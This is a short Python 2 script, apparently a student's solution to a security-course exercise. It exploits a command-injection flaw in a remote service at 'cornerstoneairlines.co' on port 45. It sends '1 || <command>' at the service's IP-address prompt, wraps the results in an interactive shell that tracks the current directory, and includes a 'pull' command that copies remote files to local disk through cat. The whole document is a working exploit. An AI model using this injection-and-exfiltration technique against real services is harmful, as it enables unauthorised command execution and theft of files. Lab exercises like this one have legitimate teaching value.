"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	while "Enter IP address:" not in s.recv(1024):
		continue
	s.send("1 || " + cmd + "\n")
	try:
		return s.recv(4096)[:-1]
	finally:
		s.close()
	

def shell():
	directory = execute_cmd("pwd").strip()
	
	while True:
		text = raw_input(directory + ">").strip()
		if text == "exit":
			break
		elif text.startswith("cd "):
			directory = execute_cmd("(cd " + directory + " && " + text + " && pwd)").strip()
		else:
			print(execute_cmd("(cd " + directory + " && " + text + ")"))

if __name__ == '__main__':
	while True:
		text = raw_input("? ").strip()
		if text == "shell":
			shell()
		elif text == "help":
			print("shell Drop into an interactive shell and allow users to gracefully exit")
			print("pull <remote-path> <local-path> Download files")
			print("help Shows this help menu")
			print("quit Quit the shell")
		elif text == "quit":
			break
		elif text.startswith("pull"):
			_, remote, local = text.split(" ")
			
			str = execute_cmd("cat " + remote)
			f = open(local, "w")
			f.write(str) 
			f.close()
			
		
	
	